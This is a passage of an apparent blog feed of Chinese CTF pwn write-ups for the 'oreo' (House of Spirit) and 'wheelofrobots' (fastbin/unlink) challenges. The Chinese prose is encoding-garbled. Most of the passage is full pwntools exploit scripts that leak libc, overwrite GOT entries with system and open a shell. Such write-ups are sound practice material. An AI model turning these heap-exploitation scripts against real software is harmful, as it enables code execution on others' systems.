Tableå†…å®¹å¯¹ç¨‹åºæ‰§è¡Œå®Œå…¨ä¸å½±å“ï¼Œå¯ä»¥å®Œå…¨æ”¹æ‰ï¼Œæ­£å¸¸æ‰§è¡Œ(è¿™ä¸ªä¹Ÿå’ŒåŠ¨æ€linkerç‰ˆæœ¬æœ‰å…³)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">// èŠ‚åç§°åœ¨ .shstrtab èŠ‚ä¸­çš„ç´¢å¼•</span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// èŠ‚ç±»å‹</span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// èŠ‚æ ‡å¿—</span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// èŠ‚çš„å†…å­˜åœ°å€</span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// èŠ‚åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡</span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// èŠ‚çš„å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰</span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// é“¾æ¥åˆ°çš„å…¶ä»–èŠ‚çš„ç´¢å¼•</span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// é¢å¤–ä¿¡æ¯</span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// å¯¹é½æ–¹å¼</span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// èŠ‚åŒ…å«å®ä½“çš„å¤§å°</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/19/23-2-21-elf/image-20230222232634953.png" alt="image-20230222232634953"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Spirit 2014 hack.lu oreo</title>
      <link href="/2023/03/17/2014-hack-lu-oreo/"/>
      <url>/2023/03/17/2014-hack-lu-oreo/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec oreo</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/oreo&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo</a></p><h2 id="æ³„éœ²åœ°å€"><a href="#æ³„éœ²åœ°å€" class="headerlink" title="æ³„éœ²åœ°å€"></a>æ³„éœ²åœ°å€</h2><p>addå‡½æ•°é‡Œå­˜åœ¨æº¢å‡ºæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure><p>å¾€nameå’Œçš„scripté‡Œé¢éƒ½æ˜¯è¯»äº†56ä¸ªå­—èŠ‚ï¼Œéƒ½å¯ä»¥æº¢å‡º</p><p>è¦†ç›–nextä¸ºputsgotåœ¨showå‡½æ•°é‡Œå¯ä»¥åœ¨ç¬¬äºŒæ¬¡æ‰“å°æ—¶æ³„éœ²</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048774                 mov     eax, [ebp+var_14]</span><br><span class="line">.text:08048777                 mov     [esp+4], eax</span><br><span class="line">.text:0804877B                 mov     dword ptr [esp], offset aDescriptionS ; &quot;Description: %s\n&quot;</span><br><span class="line">.text:08048782                 call    _printf</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥æŠŠeaxé‡Œå†…å®¹nextåœ°å€æ”¾åˆ°eaxï¼Œå¯ä»¥%sè§£ægotæ‰“å°å‡ºæ¥</p><p>puts_got&#x3D;elf.got[â€˜putsâ€™]<br>payload1 &#x3D; bâ€™aâ€™*27+p32(puts_got)<br>add(bâ€™aâ€™*25,payload1)<br>show_rifle()</p><h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p>è¿™é‡Œéœ€è¦ç»•è¿‡ä¸€äº›æ£€æµ‹</p><ul><li>fake chunk çš„ ISMMAP ä½ä¸èƒ½ä¸º 1ï¼Œå› ä¸º free æ—¶ï¼Œå¦‚æœæ˜¯ mmap çš„ chunkï¼Œä¼šå•ç‹¬å¤„ç†ã€‚</li><li>fake chunk åœ°å€éœ€è¦å¯¹é½ï¼Œ MALLOC_ALIGN_MASK</li><li>fake chunk çš„ size å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ fastbin çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½ã€‚</li><li>fake chunk çš„ next chunk çš„å¤§å°ä¸èƒ½å°äº <code>2 * SIZE_SZ</code>ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code> ã€‚</li><li>fake chunk å¯¹åº”çš„ fastbin é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ fake chunkï¼Œå³ä¸èƒ½æ„æˆ double free çš„æƒ…å†µã€‚</li></ul><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶nextï¼Œå¯ä»¥free(next),å¯ä»¥ä¿®æ”¹noticeï¼Œè€Œä¸”noticeæŒ‡é’ˆä¸Šé¢å°±å¯ä»¥æ§åˆ¶sizeå¤§å°ï¼Œå¤©ç”Ÿçš„ä¼ªé€ ï¼Œå†ç”³è¯·æ§åˆ¶0804A2A8</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bss:0804A2A4 rifle_cnt       dd ?                    ; DATA XREF: add+C5â†‘r</span><br><span class="line">.bss:0804A2A4                                         ; add+CDâ†‘w ...</span><br><span class="line">.bss:0804A2A8 ; char *notice</span><br><span class="line">.bss:0804A2A8 notice          dd ?                    ; DATA XREF: message+23â†‘r</span><br><span class="line">.bss:0804A2A8                                         ; message+3Câ†‘r ...</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”³è¯·åªèƒ½åœ¨addå‡½æ•°é‡Œé¢malloc(0x38),ä¹Ÿå°±æ˜¯è¯´sizeå¿…é¡»æ§åˆ¶ä¸º0x38+0x8æ¥ç”³è¯·ï¼Œè¿™æ ·æˆ‘ä»¬ç”³è¯·0x40ä¸ªchunkï¼Œå†æ§åˆ¶æœ€åä¸€ä¸ªnextæŒ‡é’ˆæŒ‡å‘0804A2A8ï¼Œè¿™ä¸ªä¼ªé€ chunk nextåŸŸå¿…é¡»ä¸ºç©ºï¼Œé˜²æ­¢free chunk-&gt;nextï¼Œè¿™é‡Œæ˜¯å¾€0804A2A8é‡Œé¢çš„åœ°å€0804A2c0å»å†™æ•°æ®</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230318005107301.png" alt="image-20230318005107301"></p><p>ï¼Œpadding0x20ï¼Œå³å¯æ»¡è¶³åˆ°åº•ä¸‹ä¸€ä¸ªfake chunkï¼Œå°†å…¶prev sizeå’Œsizeæ”¹ä¸ºæ»¡è¶³æ¡ä»¶å³å¯</p><p>å†é›†ä½“freeæ‰ï¼Œfastbinå…ˆè¿›å…ˆå‡ºï¼Œå†æ¬¡ç”³è¯·ä¸€ä¸ªå°±å¯ä»¥æ‹¿åˆ°0804A2A0å¤„çš„chunkï¼Œæ”¹å†™__isoc99_sscanfgotå³å¯</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230317234423315.png" alt="image-20230317234423315"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./oreo&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">descrip, name</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.sendline(descrip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_rifle</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">notice</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendline(notice)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x08048748&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(puts_got)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload1)</span><br><span class="line">show_rifle()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3e</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>*<span class="number">25</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">27</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x41</span>)+p32(<span class="number">0x50</span>)</span><br><span class="line">message(payload3)</span><br><span class="line">order()</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">sscanf_got = elf.got[<span class="string">&#x27;__isoc99_sscanf&#x27;</span>]</span><br><span class="line">add(p32(sscanf_got),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">message(p32(system_addr))</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 insomni&#39;hack wheelofrobots</title>
      <link href="/2023/03/16/2017-insomn-hack-wheelofrobots/"/>
      <url>/2023/03/16/2017-insomn-hack-wheelofrobots/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni'hack_wheelofrobots">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni&#39;hack_wheelofrobots</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec wheelofrobots</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/wheelofrobots&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>robotsæŒ‡é’ˆåœ°å€</p><p>0x6030e0- robot 4<br>0x6030e8- robot 6<br>0x6030f0- robot 2<br>0x6030f8- robot 1<br>0x603100- robot 3<br>0x603108- robot 5</p><p>å¤§å°</p><p>0x603138- robot 2<br>0x603140- robot 3<br>0x603148- robot 6</p><p>ç¨‹åºadd()é‡Œnum &#x3D; read_num((char *)&amp;choice, 5uLL);å­˜åœ¨off by oneæ¼æ´ï¼Œä¼šè¦†ç›–æ‰robots 2çš„inuseä½ï¼Œä¸€åˆ‡çš„ä¸€åˆ‡éƒ½ä»è¿™é‡Œå¼€å§‹</p><h3 id="fastbin-attachä»»æ„é•¿åº¦å †æº¢å‡º"><a href="#fastbin-attachä»»æ„é•¿åº¦å †æº¢å‡º" class="headerlink" title="fastbin attachä»»æ„é•¿åº¦å †æº¢å‡º"></a>fastbin attachä»»æ„é•¿åº¦å †æº¢å‡º</h3><p>æˆ‘ä»¬ç”³è¯·åˆ°robots2ï¼Œå¤§å°æ§åˆ¶åˆ°fastbinï¼Œ0x20æŠŠï¼Œç„¶åfreeæ‰è¿™ä¸ªchunk</p><p>è¿™ä¸ªæ—¶å€™fast bin0x20å‡ºç°è¿™ä¸ªchunkæŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡offbyoneï¼Œé‡æ–°ä½¿ç”¨è¿™ä¸ªå †ï¼Œè¿™ä¸ªæ—¶å€™å¾€è¿™ä¸ªchunké‡Œé¢å†™å…¥å€¼ï¼Œrobots2+0x10å·²ç»ä¸æ˜¯åŸæ¥çš„user dataï¼Œè€Œæ˜¯fdæŒ‡é’ˆï¼Œæˆ‘ä»¬æŠŠä»–æ”¹ä¸ºä¸€ä¸ªä¼ªé€ çš„free chunkåœ°å€ï¼Œç”³è¯·0x20å †å—çš„ç¬¬äºŒæ¬¡ï¼Œå°±å¯ä»¥ç”³è¯·åˆ°è¿™ä¸ªä¼ªé€ chunkï¼Œé‚£å°±å¯ä»¥å®ç°åœ°å€è¯»å†™ï¼Œä½†æ˜¯è¦ç»•è¿‡ï¼Œfastbin çš„size&#x3D;0x21æ£€æµ‹ï¼Œä¼ªé€ çš„free chunk+0x8éœ€è¦&#x3D;0x21ï¼Œæˆ‘ä»¬è§‚å¯Ÿç¨‹åºé€‰æ‹©åˆ°0x603138ï¼Œå› ä¸ºrobots3ï¼Œsizeæ˜¯å¯æ§ä¸º0x21çš„ï¼Œ</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230316234451675.png" alt="image-20230316234451675"></p><p>æˆ‘ä»¬æ‹¿åˆ°0x603138è¿™ä¸ªchunkåï¼Œä¼šå¾€0x603138+0x10&#x3D;0x603148,å³robot 6çš„sizeå†™å…¥å€¼ï¼Œå°±å¯ä»¥å®ç°ä»»æ„å¤§å°å †æº¢å‡º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br></pre></td></tr></table></figure><h3 id="æ„é€ unlink"><a href="#æ„é€ unlink" class="headerlink" title="æ„é€ unlink"></a>æ„é€ unlink</h3><p>å¸¸è§„æ„é€ ,ä¸å¤šbb</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>0x6030E8ï¼Œåœ°å€å†™å…¥0x6030D0</p><h3 id="è€åŠæ³•"><a href="#è€åŠæ³•" class="headerlink" title="è€åŠæ³•"></a>è€åŠæ³•</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317002742295.png" alt="image-20230317002742295"></p><p>2 6 1å¯ç”¨  puts free atoi</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">change(<span class="number">6</span>,p64(puts_plt))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">change(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">b&#x27;oice : &#x27;</span>,<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="æ–°åŠæ³•"><a href="#æ–°åŠæ³•" class="headerlink" title="æ–°åŠæ³•"></a>æ–°åŠæ³•</h3><p>æˆ‘ä»¬å…ˆ</p><p>payload &#x3D; p64(0)*2 + bâ€™aâ€™*0x18 + p64(0x6030e8)<br>change(6,payload)</p><p>æŠŠ1çš„æŒ‡é’ˆæŒ‡å‘6ï¼Œè¿™æ ·å°±å¯ä»¥å†™ä¸€ä¸ªé€šç”¨å‡½æ•°å»ä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def write(where, what):</span><br><span class="line">    change(1, p64(where))</span><br><span class="line">    change(6, p64(what))</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å»åˆ©ç”¨start_robotæ‰“å°å‡ºåœ°å€ï¼Œç”±äºæ‰“å°ç»“æŸåä¼šexitï¼Œæˆ‘ä»¬éœ€è¦å…ˆhookæ‰è¿™ä¸ªexitgotï¼Œæ”¹ä¸ºleave retæˆ–retå³å¯</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317005523642.png" alt="image-20230317005523642"></p><p>ç„¶åå»ä¿®æ”¹gotå³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317003427076.png" alt="image-20230317003427076"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./wheelofrobots&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">offset_bin_main_arena</span>(<span class="params">idx</span>):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    